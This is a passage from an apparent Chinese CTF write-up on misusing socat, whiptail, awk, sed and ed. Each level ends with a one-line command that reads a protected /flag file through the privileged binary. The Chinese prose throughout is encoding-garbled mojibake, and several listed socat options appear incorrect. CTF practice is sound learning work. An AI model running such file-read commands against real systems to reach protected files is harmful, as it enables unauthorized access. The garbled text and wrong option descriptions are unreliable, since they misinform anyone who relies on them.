<li><code>-T &lt;time&gt;</code>ï¼šè®¾ç½®æ•°æ®ä¼ è¾“è¶…æ—¶æ—¶é—´ï¼ŒæŒ‡å®š <code>socat</code> åœ¨ä¼ è¾“æ•°æ®æ—¶çš„æœ€å¤§ç­‰å¾…æ—¶é—´ã€‚</li>
<li><code>-u</code>ï¼šç”¨äºæŒ‡å®šä½¿ç”¨æ— ç¼“å†²æ¨¡å¼ï¼ˆunbuffered modeï¼‰ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒå‘Šè¯‰ <code>socat</code> åœ¨æ•°æ®ä¼ è¾“æ—¶ä¸è¦ä½¿ç”¨ç¼“å†²ï¼Œè€Œæ˜¯ç«‹å³ä¼ è¾“æ•°æ®ã€‚</li>
<li><code>-4</code>ï¼šå¼ºåˆ¶ <code>socat</code> ä½¿ç”¨ IPv4 åœ°å€ã€‚</li>
<li><code>-6</code>ï¼šå¼ºåˆ¶ <code>socat</code> ä½¿ç”¨ IPv6 åœ°å€ã€‚</li>
<li><code>-b &lt;size&gt;</code>ï¼šè®¾ç½®æ•°æ®å—å¤§å°ï¼ŒæŒ‡å®š <code>socat</code> åœ¨ä¼ è¾“æ•°æ®æ—¶ä½¿ç”¨çš„ç¼“å†²åŒºå¤§å°ã€‚</li>
<li><code>-c</code>ï¼šå…³é—­ <code>socat</code> çš„æ ‡å‡†è¾“å…¥ï¼Œä½¿å…¶åœ¨å¯åŠ¨åä¸æ¥å—é”®ç›˜è¾“å…¥ã€‚</li>
<li><code>-e</code>ï¼šä½¿ <code>socat</code> ä»¥éäº¤äº’æ¨¡å¼å¯åŠ¨ï¼Œç”¨äºå°†å…¶åµŒå…¥åˆ°è„šæœ¬ä¸­ã€‚</li>
<li><code>-p</code>ï¼šä¿æŒè¿æ¥ï¼Œä½¿ <code>socat</code> åœ¨ä¼ è¾“å®Œæˆåä¿æŒè¿æ¥çŠ¶æ€ã€‚</li>
<li><code>-x</code>ï¼šæ˜¾ç¤ºåå…­è¿›åˆ¶æ ¼å¼çš„æ•°æ®ã€‚</li>
<li><code>-S</code>ï¼šæ‰“å¼€æ—¥å¿—è®°å½•åŠŸèƒ½ï¼Œè®°å½• <code>socat</code> çš„æ‰§è¡Œæ—¥å¿—ã€‚</li>
<li><code>-N</code>ï¼šç¦ç”¨ DNS æŸ¥è¯¢ï¼ŒæŒ‡å®š <code>socat</code> ä¸è¿›è¡Œ DNS æŸ¥è¯¢ã€‚<br />
<code>socat -u FILE:/flag STDOUT</code></li>
</ul>
<p><code>socat</code> æ˜¯ä¸€ä¸ªéå¸¸çµæ´»çš„å·¥å…·ï¼Œå¯ä»¥ç”¨äºå„ç§ç½‘ç»œé€šä¿¡åœºæ™¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº› <code>socat</code> çš„å¸¸è§ç”¨æ³•ï¼š</p>
<ol>
<li>
<p><strong>TCP/UDP è¿æ¥</strong>ï¼š<code>socat</code> å¯ä»¥ç”¨äºåœ¨ä¸¤ä¸ªä¸»æœºä¹‹é—´å»ºç«‹ TCP æˆ– UDP è¿æ¥ã€‚ä¾‹å¦‚ï¼Œå°† <code>socat</code> ä½œä¸ºç®€å•çš„ TCP æœåŠ¡å™¨è¿è¡Œï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">socat TCP-LISTEN:1234,fork<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™å°†åœ¨æœ¬åœ°çš„ 1234 ç«¯å£ä¸Šå¯åŠ¨ä¸€ä¸ª TCP æœåŠ¡å™¨ï¼Œæ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥ï¼Œå¹¶å°†è¿æ¥åˆ†é…ç»™æ–°çš„å­è¿›ç¨‹æ¥å¤„ç†ã€‚</p>
</li>
<li>
<p><strong>æ–‡ä»¶ä¼ è¾“</strong>ï¼š<code>socat</code> å¯ä»¥ç”¨äºå°†æ–‡ä»¶ä»ä¸€ä¸ªåœ°æ–¹ä¼ è¾“åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼ŒåŒ…æ‹¬é€šè¿‡ç½‘ç»œä¼ è¾“æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œå°†æ–‡ä»¶ä»æœ¬åœ°ä¼ è¾“åˆ°è¿œç¨‹ä¸»æœºï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">socat FILE:&#x2F;path&#x2F;to&#x2F;local&#x2F;file TCP:remote_host:port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¼šå°†æœ¬åœ°æ–‡ä»¶ä¼ è¾“åˆ°è¿œç¨‹ä¸»æœºçš„æŒ‡å®šç«¯å£ä¸Šã€‚</p>
</li>
<li>
<p><strong>åŠ å¯†é€šä¿¡</strong>ï¼š<code>socat</code> å¯ä»¥å’Œ <code>openssl</code> ç»“åˆä½¿ç”¨ï¼Œå®ç°åŠ å¯†çš„ç½‘ç»œé€šä¿¡ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ TLS è¿æ¥ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">socat openssl-connect:remote_host:port,verify&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¼šåœ¨æœ¬åœ°å’Œè¿œç¨‹ä¸»æœºä¹‹é—´å»ºç«‹ä¸€ä¸ªä½¿ç”¨ TLS åŠ å¯†çš„è¿æ¥ã€‚</p>
</li>
<li>
<p><strong>ä¸²å£é€šä¿¡</strong>ï¼š<code>socat</code> å¯ä»¥ç”¨äºåœ¨ä¸²å£ä¹‹é—´ä¼ è¾“æ•°æ®ï¼Œä¾‹å¦‚ RS232ã€RS485 ç­‰ã€‚ä¾‹å¦‚ï¼Œå°†æ•°æ®ä»ä¸€ä¸ªä¸²å£ä¼ è¾“åˆ°å¦ä¸€ä¸ªä¸²å£ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">socat &#x2F;dev&#x2F;ttyS0,raw,echo&#x3D;0 &#x2F;dev&#x2F;ttyS1,raw,echo&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¼šå°† <code>/dev/ttyS0</code> çš„æ•°æ®ä¼ è¾“åˆ° <code>/dev/ttyS1</code>ã€‚</p>
</li>
<li>
<p><strong>ç«¯å£è½¬å‘</strong>ï¼š<code>socat</code> å¯ä»¥ç”¨äºç«¯å£è½¬å‘ï¼Œå°†ä¸€ä¸ªç«¯å£ä¸Šæ”¶åˆ°çš„æ•°æ®è½¬å‘åˆ°å¦ä¸€ä¸ªç«¯å£ã€‚ä¾‹å¦‚ï¼Œå°†æœ¬åœ°çš„ 8080 ç«¯å£ä¸Šæ”¶åˆ°çš„æ•°æ®è½¬å‘åˆ°è¿œç¨‹ä¸»æœºçš„ 80 ç«¯å£ä¸Šï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">socat TCP-LISTEN:8080,fork TCP:remote_host:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¼šå°†æœ¬åœ° 8080 ç«¯å£çš„æ•°æ®è½¬å‘åˆ°è¿œç¨‹ä¸»æœºçš„ 80 ç«¯å£ä¸Šã€‚</p>
</li>
</ol>
<p><code>socat -u &quot;file:/flag&quot; STDOUT</code></p>
<h3 id="level33whiptail"><a class="markdownIt-Anchor" href="#level33whiptail"></a> level33(whiptail)</h3>
<p><code>whiptail</code> æ˜¯ä¸€ä¸ªåœ¨ç»ˆç«¯ä¸­æ˜¾ç¤ºå¯¹è¯æ¡†çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¸¸ç”¨äºè„šæœ¬ä¸­åˆ›å»ºç”¨æˆ·å‹å¥½çš„äº¤äº’ç•Œé¢ã€‚å®ƒå¯ä»¥ç”¨äºæ˜¾ç¤ºå„ç§ç±»å‹çš„å¯¹è¯æ¡†ï¼ŒåŒ…æ‹¬æ¶ˆæ¯æ¡†ã€è¾“å…¥æ¡†ã€é€‰æ‹©æ¡†ç­‰ï¼Œä»¥ä¾¿ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ <code>whiptail</code> çš„åŸºæœ¬ç”¨æ³•ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail [options] &lt;args&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å…¶ä¸­ <code>[options]</code> æ˜¯ä¸€äº›é€‰é¡¹ï¼Œ<code>&lt;args&gt;</code> æ˜¯ç”¨äºæŒ‡å®šå¯¹è¯æ¡†ç±»å‹å’Œå†…å®¹çš„å‚æ•°ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ <code>whiptail</code> å¯¹è¯æ¡†ç±»å‹å’Œç¤ºä¾‹ç”¨æ³•ï¼š</p>
<ol>
<li>
<p><strong>æ¶ˆæ¯æ¡†</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail --msgbox &quot;This is a message&quot; 10 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¼šåœ¨ç»ˆç«¯ä¸­æ˜¾ç¤ºä¸€ä¸ªæ¶ˆæ¯æ¡†ï¼Œæ˜¾ç¤ºæ–‡æœ¬ â€œThis is a messageâ€ï¼Œæ¡†çš„å¤§å°ä¸º 10 è¡Œ 40 åˆ—ã€‚</p>
</li>
<li>
<p><strong>è¾“å…¥æ¡†</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail --inputbox &quot;Enter your name:&quot; 10 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¼šåœ¨ç»ˆç«¯ä¸­æ˜¾ç¤ºä¸€ä¸ªè¾“å…¥æ¡†ï¼Œæç¤ºç”¨æˆ·è¾“å…¥åç§°ã€‚</p>
</li>
<li>
<p><strong>é€‰æ‹©æ¡†</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail --menu &quot;Choose an option:&quot; 15 40 4 \
&quot;1&quot; &quot;Option 1&quot; \
&quot;2&quot; &quot;Option 2&quot; \
&quot;3&quot; &quot;Option 3&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™ä¼šåœ¨ç»ˆç«¯ä¸­æ˜¾ç¤ºä¸€ä¸ªé€‰æ‹©æ¡†ï¼Œä¾›ç”¨æˆ·ä»å‡ ä¸ªé€‰é¡¹ä¸­é€‰æ‹©ã€‚</p>
</li>
<li>
<p><strong>Yes/No å¯¹è¯æ¡†</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">whiptail --yesno &quot;Do you want to continue?&quot; 10 40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>è¿™ä¼šåœ¨ç»ˆç«¯ä¸­æ˜¾ç¤ºä¸€ä¸ª Yes/No å¯¹è¯æ¡†ï¼Œè¯¢é—®ç”¨æˆ·æ˜¯å¦è¦ç»§ç»­æ“ä½œã€‚</p>
</li>
</ol>
<p>é€šè¿‡æŸ¥é˜…<code>man</code>æ–‡æ¡£å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ˜¾ç¤ºæ–‡ä»¶å†…å®¹çš„å‘½ä»¤</p>
<p><code>whiptail --textbox /flag 10 20</code></p>
<ul>
<li><code>whiptail</code> æ˜¯ç”¨äºåˆ›å»ºå¯¹è¯æ¡†çš„å‘½ä»¤ã€‚</li>
<li><code>--textbox</code> è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªæ–‡æœ¬æ¡†å¯¹è¯æ¡†ï¼Œç”¨äºæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ã€‚</li>
<li><code>/flag</code> æ˜¯æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„ï¼Œå³è¦æ˜¾ç¤ºå†…å®¹çš„æ–‡ä»¶ã€‚</li>
<li><code>10</code> æ˜¯æŒ‡å®šå¯¹è¯æ¡†çš„é«˜åº¦ï¼Œè¡¨ç¤ºæ–‡æœ¬æ¡†åœ¨å‚ç›´æ–¹å‘ä¸Šå¯ä»¥æ˜¾ç¤ºçš„è¡Œæ•°ã€‚</li>
<li><code>20</code> æ˜¯æŒ‡å®šå¯¹è¯æ¡†çš„å®½åº¦ï¼Œè¡¨ç¤ºæ–‡æœ¬æ¡†åœ¨æ°´å¹³æ–¹å‘ä¸Šå¯ä»¥æ˜¾ç¤ºçš„å­—ç¬¦æ•°ã€‚</li>
</ul>
<h3 id="level34awk"><a class="markdownIt-Anchor" href="#level34awk"></a> level34(awk)</h3>
<p><code>awk</code> æ˜¯ä¸€ç§å¼ºå¤§çš„æ–‡æœ¬å¤„ç†å·¥å…·ï¼Œé€šå¸¸ç”¨äºå¯¹ç»“æ„åŒ–æ–‡æœ¬æ•°æ®è¿›è¡Œå¤„ç†ã€åˆ†æå’Œè½¬æ¢ã€‚å®ƒä»¥é€è¡Œæ–¹å¼æ‰«æè¾“å…¥æ–‡ä»¶ï¼Œå¹¶æ ¹æ®æŒ‡å®šçš„æ¨¡å¼å’ŒåŠ¨ä½œå¯¹æ•°æ®è¿›è¡Œå¤„ç†ã€‚ä»¥ä¸‹æ˜¯ <code>awk</code> å¸¸è§ç”¨æ³•å’Œå‚æ•°çš„æ¦‚è¿°ï¼š</p>
<h4 id="åŸºæœ¬è¯­æ³•"><a class="markdownIt-Anchor" href="#åŸºæœ¬è¯­æ³•"></a> åŸºæœ¬è¯­æ³•</h4>
<pre class="line-numbers language-none"><code class="language-none">awk [options] &#39;pattern &#123;action&#125;&#39; file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li><code>options</code>ï¼š<code>awk</code> çš„é€‰é¡¹ï¼Œç”¨äºæŒ‡å®šä¸€äº›æ§åˆ¶è¡Œä¸ºï¼Œä¾‹å¦‚å­—æ®µåˆ†éš”ç¬¦ã€å¤„ç†æ–‡ä»¶å¼€å§‹å’Œç»“æŸç­‰ã€‚</li>
<li><code>pattern</code>ï¼šæ¨¡å¼ï¼Œç”¨äºåŒ¹é…è¾“å…¥æ•°æ®çš„è¡Œã€‚</li>
<li><code>&#123;action&#125;</code>ï¼šåŠ¨ä½œï¼Œç”¨äºå¯¹åŒ¹é…çš„è¡Œæ‰§è¡Œæ“ä½œã€‚</li>
<li><code>file</code>ï¼šè¦å¤„ç†çš„æ–‡ä»¶åã€‚</li>
</ul>
<h4 id="å¸¸è§é€‰é¡¹"><a class="markdownIt-Anchor" href="#å¸¸è§é€‰é¡¹"></a> å¸¸è§é€‰é¡¹</h4>
<ul>
<li><code>-F &lt;separator&gt;</code>ï¼šæŒ‡å®šå­—æ®µåˆ†éš”ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå­—æ®µåˆ†éš”ç¬¦ä¸ºç©ºæ ¼æˆ–åˆ¶è¡¨ç¬¦ã€‚</li>
<li><code>-f &lt;file&gt;</code>ï¼šä»æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å– <code>awk</code> è„šæœ¬ã€‚</li>
<li><code>-v &lt;var=value&gt;</code>ï¼šè®¾ç½® <code>awk</code> å˜é‡çš„å€¼ã€‚</li>
<li><code>-W &lt;compat|posix&gt;</code>ï¼šè®¾ç½®å…¼å®¹æ€§æ¨¡å¼ã€‚</li>
<li><code>-F,</code>ï¼šæŒ‡å®šé€—å·ä¸ºå­—æ®µåˆ†éš”ç¬¦ã€‚</li>
<li><code>-v</code>ï¼šå®šä¹‰å˜é‡ï¼Œä¾‹å¦‚ <code>-v var=value</code>ã€‚</li>
</ul>
<p>åœ¨ <code>awk</code> ä¸­ï¼ŒåŠ¨ä½œæŒ‡ä»¤æ˜¯åœ¨æ¨¡å¼åŒ¹é…æˆåŠŸåæ‰§è¡Œçš„æ“ä½œã€‚å®ƒå¯ä»¥æ˜¯ä¸€ä¸ªç®€å•çš„åŠ¨ä½œï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå¤æ‚çš„åŠ¨ä½œå—ï¼Œç”¨èŠ±æ‹¬å· <code>&#123;&#125;</code> æ‹¬èµ·æ¥ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„ <code>awk</code> åŠ¨ä½œæŒ‡ä»¤ï¼š</p>
<ol>
<li>
<p><strong>print</strong>ï¼šæ‰“å°å½“å‰è¡Œæˆ–æŒ‡å®šå­—æ®µçš„å†…å®¹ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; print &#125;&#39; file.txt
awk &#39;&#123; print $1, $2 &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>assignment</strong>ï¼šèµ‹å€¼æ“ä½œï¼Œå°†ä¸€ä¸ªå€¼èµ‹ç»™å˜é‡ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; x &#x3D; $1 + $2; print x &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>if-else</strong>ï¼šæ¡ä»¶è¯­å¥ï¼Œæ ¹æ®æ¡ä»¶æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; if ($1 &gt; 10) print &quot;Greater&quot;; else print &quot;Smaller&quot; &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>for</strong>ï¼šå¾ªç¯è¯­å¥ï¼Œå¯¹ä¸€ç»„å€¼è¿›è¡Œè¿­ä»£å¤„ç†ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; for (i &#x3D; 1; i &lt;&#x3D; NF; i++) print $i &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>while</strong>ï¼šå¾ªç¯è¯­å¥ï¼Œæ ¹æ®æ¡ä»¶é‡å¤æ‰§è¡Œæ“ä½œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; i &#x3D; 1; while (i &lt;&#x3D; NF) &#123; print $i; i++ &#125; &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>split</strong>ï¼šå°†å­—ç¬¦ä¸²æ‹†åˆ†ä¸ºæ•°ç»„ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; split($0, arr, &quot;,&quot;); print arr[1] &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>delete</strong>ï¼šåˆ é™¤æ•°ç»„ä¸­çš„å…ƒç´ ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; delete arr[$1] &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>next</strong>ï¼šè·³è¿‡å½“å‰è¡Œï¼Œç»§ç»­å¤„ç†ä¸‹ä¸€è¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; if ($1 &#x3D;&#x3D; &quot;skip&quot;) next; print &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>exit</strong>ï¼šç«‹å³ç»ˆæ­¢ <code>awk</code> çš„æ‰§è¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123; if ($1 &#x3D;&#x3D; &quot;stop&quot;) exit; print &#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>è¿™äº›æ˜¯ <code>awk</code> ä¸­å¸¸è§çš„åŠ¨ä½œæŒ‡ä»¤ï¼Œå¯ä»¥æ ¹æ®å…·ä½“çš„éœ€æ±‚ç¼–å†™å¤æ‚çš„ <code>awk</code> è„šæœ¬æ¥å¤„ç†æ–‡æœ¬æ•°æ®ã€‚</p>
<h4 id="å¸¸è§ç”¨æ³•ç¤ºä¾‹"><a class="markdownIt-Anchor" href="#å¸¸è§ç”¨æ³•ç¤ºä¾‹"></a> å¸¸è§ç”¨æ³•ç¤ºä¾‹</h4>
<ol>
<li>
<h5 id="æ‰“å°æŒ‡å®šåˆ—"><a class="markdownIt-Anchor" href="#æ‰“å°æŒ‡å®šåˆ—"></a> <strong>æ‰“å°æŒ‡å®šåˆ—</strong>ï¼š</h5>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123;print $1, $3&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="æ ¹æ®æ¡ä»¶ç­›é€‰è¡Œ"><a class="markdownIt-Anchor" href="#æ ¹æ®æ¡ä»¶ç­›é€‰è¡Œ"></a> <strong>æ ¹æ®æ¡ä»¶ç­›é€‰è¡Œ</strong>ï¼š</h5>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;$3 &gt; 50&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="ç»Ÿè®¡è¡Œæ•°"><a class="markdownIt-Anchor" href="#ç»Ÿè®¡è¡Œæ•°"></a> <strong>ç»Ÿè®¡è¡Œæ•°</strong>ï¼š</h5>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;END &#123;print NR&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="è®¡ç®—åˆ—çš„æ€»å’Œ"><a class="markdownIt-Anchor" href="#è®¡ç®—åˆ—çš„æ€»å’Œ"></a> <strong>è®¡ç®—åˆ—çš„æ€»å’Œ</strong>ï¼š</h5>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;&#123;sum +&#x3D; $1&#125; END &#123;print sum&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="æŒ‡å®šå­—æ®µåˆ†éš”ç¬¦"><a class="markdownIt-Anchor" href="#æŒ‡å®šå­—æ®µåˆ†éš”ç¬¦"></a> <strong>æŒ‡å®šå­—æ®µåˆ†éš”ç¬¦</strong>ï¼š</h5>
<pre class="line-numbers language-none"><code class="language-none">awk -F, &#39;&#123;print $1&#125;&#39; file.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="ä½¿ç”¨-awk-è„šæœ¬æ–‡ä»¶"><a class="markdownIt-Anchor" href="#ä½¿ç”¨-awk-è„šæœ¬æ–‡ä»¶"></a> <strong>ä½¿ç”¨ <code>awk</code> è„šæœ¬æ–‡ä»¶</strong>ï¼š</h5>
<pre class="line-numbers language-none"><code class="language-none">awk -f script.awk file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<h5 id="å®šä¹‰å˜é‡"><a class="markdownIt-Anchor" href="#å®šä¹‰å˜é‡"></a> <strong>å®šä¹‰å˜é‡</strong>ï¼š</h5>
<pre class="line-numbers language-none"><code class="language-none">awk -v var&#x3D;10 &#39;&#123;print $1, var&#125;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'&#123; print &#125;'</span> /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="level35sed"><a class="markdownIt-Anchor" href="#level35sed"></a> level35(sed)</h3>
<p><code>sed</code> æ˜¯ä¸€ä¸ªæµç¼–è¾‘å™¨ï¼Œä¸»è¦ç”¨äºå¯¹æ–‡æœ¬è¿›è¡Œç¼–è¾‘ã€è½¬æ¢å’Œè¿‡æ»¤ã€‚å®ƒå¯ä»¥è¯»å–æ–‡æœ¬æ–‡ä»¶ï¼Œé€è¡Œå¤„ç†æ–‡æœ¬ï¼Œå¹¶æ ¹æ®æŒ‡å®šçš„ç¼–è¾‘å‘½ä»¤å¯¹æ–‡æœ¬è¿›è¡Œä¿®æ”¹ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ <code>sed</code> æŒ‡ä»¤ï¼š</p>
<ol>
<li>
<p><strong>æ›¿æ¢æ–‡æœ¬</strong>ï¼š<code>s/old/new/</code>ï¼Œå°†æ¯ä¸€è¡Œä¸­çš„ <code>old</code> æ›¿æ¢ä¸º <code>new</code>ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;s&#x2F;old&#x2F;new&#x2F;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>å…¨å±€æ›¿æ¢</strong>ï¼š<code>s/old/new/g</code>ï¼Œå°†æ¯ä¸€è¡Œä¸­çš„æ‰€æœ‰ <code>old</code> æ›¿æ¢ä¸º <code>new</code>ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;s&#x2F;old&#x2F;new&#x2F;g&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>è¡Œåˆ é™¤</strong>ï¼š<code>d</code>ï¼Œåˆ é™¤åŒ¹é…çš„è¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;d&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>è¡Œæ‰“å°</strong>ï¼š<code>p</code>ï¼Œæ‰“å°åŒ¹é…çš„è¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">sed -n &#39;&#x2F;pattern&#x2F;p&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>è¡Œè¿½åŠ </strong>ï¼š<code>a</code>ï¼Œåœ¨åŒ¹é…è¡Œåæ·»åŠ æ–°è¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;a new line&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>è¡Œæ’å…¥</strong>ï¼š<code>i</code>ï¼Œåœ¨åŒ¹é…è¡Œå‰æ’å…¥æ–°è¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;i new line&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>è¡Œæ›¿æ¢</strong>ï¼š<code>c</code>ï¼Œå°†åŒ¹é…è¡Œæ›¿æ¢ä¸ºæ–°æ–‡æœ¬ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;pattern&#x2F;c new line&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ‰“å°è¡Œå·</strong>ï¼š<code>=</code></p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x3D;&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>åˆ é™¤ç©ºè¡Œ</strong>ï¼š<code>/^$/d</code>ï¼Œåˆ é™¤ç©ºç™½è¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">sed &#39;&#x2F;^$&#x2F;d&#39; file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong>ï¼šæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæ¨¡å¼åŒ¹é…å’Œæ›¿æ¢ã€‚</p>
</li>
</ol>
<p>è¿™äº›æ˜¯ <code>sed</code> ä¸­å¸¸ç”¨çš„ä¸€äº›æŒ‡ä»¤ï¼Œå¯ä»¥æ ¹æ®å…·ä½“çš„éœ€æ±‚å’Œæ–‡æœ¬æ•°æ®ç¼–å†™å¤æ‚çš„ <code>sed</code> è„šæœ¬æ¥å¤„ç†æ–‡æœ¬ã€‚</p>
<p><code>sed -n 'p' /flag </code></p>
<h3 id="level36ed"><a class="markdownIt-Anchor" href="#level36ed"></a> level36(ed)</h3>
<p><code>ed</code> æ˜¯ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå¯ä»¥åœ¨ç»ˆç«¯ä¸­ä»¥è¡Œä¸ºå•ä½å¯¹æ–‡æœ¬æ–‡ä»¶è¿›è¡Œç¼–è¾‘ã€‚è™½ç„¶ <code>ed</code> çš„ä½¿ç”¨æ–¹å¼ç›¸å¯¹è¾ƒå¤æ‚ï¼Œä½†å®ƒæ˜¯ Unix ç³»ç»Ÿä¸­æœ€æ—©çš„ç¼–è¾‘å™¨ä¹‹ä¸€ï¼Œå¯¹äºåœ¨çº¯æ–‡æœ¬ç»ˆç«¯ç¯å¢ƒä¸‹è¿›è¡Œç¼–è¾‘æ“ä½œéå¸¸æœ‰ç”¨ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ <code>ed</code> æŒ‡ä»¤å’Œç”¨æ³•ï¼š</p>
<ol>
<li>
<p><strong>æ‰“å¼€æ–‡ä»¶</strong>ï¼šæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œç¼–è¾‘ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">ed filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
